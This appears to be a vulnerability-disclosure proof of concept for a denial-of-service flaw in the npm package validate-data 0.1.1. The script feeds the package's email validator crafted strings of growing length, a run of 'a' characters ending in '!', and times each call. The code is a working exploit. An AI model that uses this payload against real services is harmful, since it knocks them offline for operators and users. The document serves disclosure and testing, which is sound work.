/**
 * validate-data@0.1.1
 * Package Manager: npm
 * Link to published package: https://github.com/exp-anoop/validate-data
 * Link to GitHub repo: https://github.com/exp-anoop/validate-data
 * Severity level: High
 * Module Description: NodeJs backend library for validate data against the rules provided.
 * Additional Info: It allows cause a denial of service when validating crafted invalid emails.
 * Contacted maintainer?: No
 * Open issue?: No
 */

const validate = require('validate-data');

function build_blank(n) {
 var ret = ""
 for (var i = 0; i < n; i++) {
  ret += "a"
 }
 return ret + "!";
}

// Validation rules
const rules = {
        required: "email name age",
        email: "email",
        string: "email name",
        number: "age",
        array: "options",
        boolean: "status"
    };

for(var i = 1; i <= 5000000; i++) {
        var time = Date.now();
        var attack_str = build_blank(i)
       // Data to be validated
const data = {
    email: attack_str,
    name: "John",
    age: 25,
    options: [1,2,3],
    status: true
};

// Using the package
let error = validate(data, rules);

console.log(error);
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
}